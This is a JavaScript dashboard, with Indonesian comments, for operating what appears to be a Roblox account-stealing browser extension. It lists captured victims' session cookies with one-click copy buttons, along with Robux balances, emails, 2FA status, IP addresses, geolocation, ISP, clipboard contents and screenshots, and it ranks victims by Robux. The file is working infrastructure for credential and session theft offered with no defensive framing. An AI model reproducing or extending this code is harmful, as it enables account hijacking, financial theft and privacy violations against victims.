// API Base URL
const API_URL = window.location.origin;

// API Key — diambil dari Pastebin
let API_KEY = '';

async function loadApiKey() {
    const response = await fetch('/config');
    const data = await response.json();
    API_KEY = data.apiKey;
}

// Simpan accounts di memory supaya filter tidak perlu fetch ulang
let allAccounts = [];

// Load data on page load
document.addEventListener('DOMContentLoaded', async () => {
    await loadApiKey();
    loadData();
    // Auto refresh every 30 seconds
    setInterval(loadData, 30000);
});

// Load all data
async function loadData() {
    try {
        const response = await fetch(`${API_URL}/api/accounts`, {
            headers: { 'x-api-key': API_KEY }
        });
        const data = await response.json();

        if (data.success) {
            allAccounts = data.accounts || [];
            renderAccounts(allAccounts);
            updateStats(data.stats, allAccounts);
            loadLogs();
        }
    } catch (error) {
        console.error('Error loading data:', error);
        document.getElementById('accountsGrid').innerHTML =
            '<div class="loading">❌ Error loading data. Please refresh.</div>';
    }
}

// Render accounts (terima array, apply filter & sort di sini)
function renderAccounts(accounts) {
    const grid = document.getElementById('accountsGrid');

    const filtered = applyFilter(accounts);

    if (!filtered || filtered.length === 0) {
        grid.innerHTML = `
            <div class="loading" style="grid-column: 1/-1;">
                📭 No accounts captured yet
                <br><small style="color: #445566;">Waiting for data from extension...</small>
            </div>
        `;
        return;
    }

    grid.innerHTML = filtered.map(account => `
        <div class="account-card">
            <span class="badge ${account.premium ? 'badge-premium' : 'badge-free'}">
                ${account.premium ? '⭐ PREMIUM' : 'FREE'}
            </span>
            ${account.twoFAEnabled ? '<span class="badge badge-2fa">🔒 2FA</span>' : ''}

            <div class="username">${account.displayName || account.username || 'Unknown'}</div>
            <div class="user-id">🆔 ${account.userId || 'N/A'}</div>

            <div class="info-grid">
                <div class="info-item">
                    <span class="label">💰 Robux</span>
                    <span class="value">${(account.robux || 0).toLocaleString()} R$</span>
                </div>
                <div class="info-item">
                    <span class="label">👥 Friends</span>
                    <span class="value">${account.friends || 0}</span>
                </div>
                <div class="info-item">
                    <span class="label">📅 Account Age</span>
                    <span class="value">${account.accountAge || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="label">📧 Email</span>
                    <span class="value">${account.emailVerified ? '✅' : '❌'} ${account.email || 'N/A'}</span>
                </div>
                <div class="info-item" style="grid-column: 1/-1;">
                    <span class="label">📦 Inventory Value</span>
                    <span class="value">${(account.inventoryValue || 0).toLocaleString()} R$</span>
                </div>
            </div>

            <div class="cookie-box">
                <textarea readonly rows="2">${account.cookie || 'No cookie'}</textarea>
                <button class="copy-btn" onclick="copyCookie('${(account.cookie || '').replace(/'/g, "\\'")}')">📋 Copy</button>
            </div>

            <div class="actions">
                <button class="btn-profile" onclick="openProfile('${account.userId}')">👤 Profile</button>
                <button class="btn-delete" onclick="deleteAccount('${account.userId}')">🗑️ Delete</button>
            </div>
        </div>
    `).join('');
}

// FIX: Ganti nama jadi applyFilter agar tidak konflik dengan fungsi refresh di bawah
function applyFilter(accounts) {
    const search = (document.getElementById('searchInput')?.value || '').toLowerCase();
    const premiumFilter = document.getElementById('filterPremium')?.value || 'all';
    const sortBy = document.getElementById('sortBy')?.value || 'newest';

    let filtered = accounts || [];

    // Search
    if (search) {
        filtered = filtered.filter(a =>
            a.username?.toLowerCase().includes(search) ||
            a.displayName?.toLowerCase().includes(search) ||
            String(a.userId || '').includes(search)
        );
    }

    // Premium filter
    if (premiumFilter === 'premium') {
        filtered = filtered.filter(a => a.premium === true);
    } else if (premiumFilter === 'free') {
        filtered = filtered.filter(a => !a.premium);
    }

    // Sort
    if (sortBy === 'newest') {
        filtered.sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
    } else if (sortBy === 'oldest') {
        filtered.sort((a, b) => new Date(a.createdAt || 0) - new Date(b.createdAt || 0));
    } else if (sortBy === 'robux') {
        filtered.sort((a, b) => (b.robux || 0) - (a.robux || 0));
    }

    return filtered;
}

// Update stats - FIX: pakai data accounts yang sudah ada, tidak fetch ulang
function updateStats(stats, accounts) {
    document.getElementById('totalAccounts').textContent = stats?.totalAccounts || accounts.length || 0;
    document.getElementById('totalRobux').textContent = (stats?.totalRobux || 0).toLocaleString();

    // Hitung premium dari data yang sudah ada (tidak perlu fetch lagi)
    const premiumCount = (accounts || []).filter(a => a.premium).length;
    document.getElementById('premiumCount').textContent = premiumCount;
}

// Load logs
async function loadLogs() {
    try {
        const response = await fetch(`${API_URL}/api/stats`, {
            headers: { 'x-api-key': API_KEY }
        });
        const data = await response.json();

        if (data.success && data.recentLogs) {
            const container = document.getElementById('logsContainer');
            container.innerHTML = data.recentLogs.reverse().map(log => `
                <div class="log-entry">
                    <span>
                        <span class="log-type ${log.type}">${log.type}</span>
                        ${log.username ? `@${log.username}` : ''}
                        ${log.content ? `: ${log.content.substring(0, 50)}` : ''}
                    </span>
                    <span class="log-time">${new Date(log.timestamp).toLocaleString()}</span>
                </div>
            `).join('');
        }
    } catch (error) {
        console.error('Error loading logs:', error);
    }
}

// Copy cookie
function copyCookie(cookie) {
    if (cookie && cookie !== 'No cookie') {
        navigator.clipboard.writeText(cookie).then(() => {
            alert('✅ Cookie copied to clipboard!');
        }).catch(() => {
            // Fallback untuk browser yang tidak support clipboard API
            const textarea = document.createElement('textarea');
            textarea.value = cookie;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            alert('✅ Cookie copied!');
        });
    } else {
        alert('❌ No cookie to copy');
    }
}

// Open Roblox profile
function openProfile(userId) {
    window.open(`https://www.roblox.com/users/${userId}/profile`, '_blank');
}
// ============================================
// FUNGSI UNTUK SCREENSHOT
// ============================================
let currentScreenshotAccountId = null;

function viewScreenshot(userId) {
    const account = allAccounts.find(a => String(a.userId) === String(userId));
    if (!account || !account.screenshot) {
        alert('No screenshot available for this account.');
        return;
    }
    currentScreenshotAccountId = userId;
    document.getElementById('screenshotImage').src = account.screenshot;
    document.getElementById('screenshotModal').classList.add('visible');
}

function closeScreenshotModal() {
    document.getElementById('screenshotModal').classList.remove('visible');
    currentScreenshotAccountId = null;
}

function downloadScreenshot() {
    const img = document.getElementById('screenshotImage');
    if (!img.src) return;
    const link = document.createElement('a');
    link.download = `screenshot_${currentScreenshotAccountId || Date.now()}.jpg`;
    link.href = img.src;
    link.click();
}

// ============================================
// FUNGSI COPY TEXT (Clipboard)
// ============================================
function copyText(text) {
    if (!text) {
        alert('Nothing to copy');
        return;
    }
    navigator.clipboard.writeText(text).then(() => {
        alert('✅ Copied to clipboard!');
    }).catch(() => {
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        alert('✅ Copied!');
    });
}

// ============================================
// PERBAIKI RENDER ACCOUNTS (tambahkan data IP, screenshot, clipboard)
// ============================================
function renderAccounts(accounts) {
    const grid = document.getElementById('accountsGrid');
    const filtered = applyFilter(accounts);

    if (!filtered || filtered.length === 0) {
        grid.innerHTML = `<div class="loading" style="grid-column:1/-1;">📭 No accounts</div>`;
        return;
    }

    grid.innerHTML = filtered.map(account => `
        <div class="account-card">
            <span class="badge ${account.premium ? 'badge-premium' : 'badge-free'}">
                ${account.premium ? '⭐ PREMIUM' : 'FREE'}
            </span>
            ${account.twoFAEnabled ? '<span class="badge badge-2fa">🔒 2FA</span>' : ''}

            <div class="username">${account.displayName || account.username || 'Unknown'}</div>
            <div class="user-id">🆔 ${account.userId || 'N/A'}</div>

            <div class="info-grid">
                <div class="info-item">
                    <span class="label">💰 Robux</span>
                    <span class="value">${(account.robux || 0).toLocaleString()} R$</span>
                </div>
                <div class="info-item">
                    <span class="label">👥 Friends</span>
                    <span class="value">${account.friends || 0}</span>
                </div>
                <div class="info-item">
                    <span class="label">📅 Age</span>
                    <span class="value">${account.accountAge || 'N/A'}</span>
                </div>
                <div class="info-item">
                    <span class="label">📧 Email</span>
                    <span class="value">${account.emailVerified ? '✅' : '❌'} ${account.email || 'N/A'}</span>
                </div>
            </div>

            <!-- IP & Location -->
            <div class="ip-location">
                <div style="display:flex; justify-content:space-between; font-size:12px; color:var(--text-secondary);">
                    <span>🌐 IP: <strong style="color:var(--text-primary);">${account.ip || 'Unknown'}</strong></span>
                    <span>📍 ${account.location?.country || 'Unknown'}, ${account.location?.city || ''}</span>
                </div>
                <div style="font-size:11px; color:var(--text-muted); margin-top:4px;">
                    ${account.location?.isp || 'ISP Unknown'} · ${account.device?.platform || 'Device Unknown'}
                </div>
            </div>

            <!-- Clipboard -->
            ${account.clipboard?.hasData ? `
                <div style="margin-top:10px; background:rgba(255,255,255,0.03); border-radius:var(--radius-sm); padding:6px 10px; font-size:12px; color:var(--text-secondary);">
                    📋 Clipboard: <span style="color:var(--text-primary);">${account.clipboard.text.substring(0, 80)}${account.clipboard.text.length > 80 ? '...' : ''}</span>
                    <button class="copy-btn" onclick="copyText('${(account.clipboard.text || '').replace(/'/g, "\\'")}')" style="background:none; border:none; color:var(--accent-cyan); cursor:pointer; margin-left:6px;">Copy</button>
                </div>
            ` : ''}

            <!-- Screenshot -->
            ${account.screenshot ? `
                <div style="margin-top:10px;">
                    <button class="btn-screenshot" onclick="viewScreenshot('${account.userId}')">🖼️ View Screenshot</button>
                </div>
            ` : ''}

            <!-- Cookie & Actions -->
            <div class="cookie-box" style="margin-top:12px;">
                <textarea readonly rows="2">${account.cookie || 'No cookie'}</textarea>
                <button class="copy-btn" onclick="copyCookie('${(account.cookie || '').replace(/'/g, "\\'")}')">📋 Copy</button>
            </div>
            <div class="actions">
                <button class="btn-profile" onclick="openProfile('${account.userId}')">👤 Profile</button>
                <button class="btn-delete" onclick="deleteAccount('${account.userId}')">🗑️ Delete</button>
            </div>
        </div>
    `).join('');

    // Refresh Lucide icons jika ada
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

// ============================================
// UPDATE STATS (tambahkan total screenshot, dll)
// ============================================
function updateStats(stats, accounts) {
    document.getElementById('totalAccounts').textContent = stats?.totalAccounts || accounts.length || 0;
    document.getElementById('totalRobux').textContent = (stats?.totalRobux || 0).toLocaleString();
    const premiumCount = (accounts || []).filter(a => a.premium).length;
    document.getElementById('premiumCount').textContent = premiumCount;

    // Tambahan: total screenshot & clipboard
    const totalScreenshots = (accounts || []).filter(a => a.screenshot).length;
    const totalClipboards = (accounts || []).filter(a => a.clipboard?.hasData).length;
    document.getElementById('totalScreenshots').textContent = totalScreenshots;
    document.getElementById('totalClipboards').textContent = totalClipboards;
}
// Delete account
async function deleteAccount(userId) {
    if (confirm('⚠️ Are you sure you want to delete this account?')) {
        try {
            const response = await fetch(`${API_URL}/api/account/${userId}`, {
                method: 'DELETE',
                headers: { 'x-api-key': API_KEY }
            });
            const data = await response.json();

            if (data.success) {
                alert('✅ Account deleted successfully');
                loadData();
            } else {
                alert('❌ Failed to delete account');
            }
        } catch (error) {
            alert('❌ Error deleting account');
        }
    }
}

// FIX: Fungsi ini dipanggil dari tombol filter/search/sort di HTML
// Tidak lagi konflik dengan applyFilter()
function refreshFilter() {
    renderAccounts(allAccounts);
}
